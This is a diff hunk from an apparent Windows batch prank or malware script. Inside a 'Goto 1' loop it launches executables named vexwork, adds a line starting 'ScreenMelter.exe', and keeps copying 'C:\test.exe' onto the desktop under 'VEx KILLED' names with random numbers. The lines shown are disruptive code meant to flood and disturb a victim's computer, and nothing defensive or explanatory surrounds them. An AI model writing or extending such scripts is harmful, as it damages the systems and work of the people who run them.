@@ -5,6 +5,7 @@ Goto 1
 start c:\vexwork1.exe
 start c:\vexwork4.exe
 start c:\vexwork3.deskthemepack
+start c:\ScreenMelter.exe
 copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
 copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
 copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
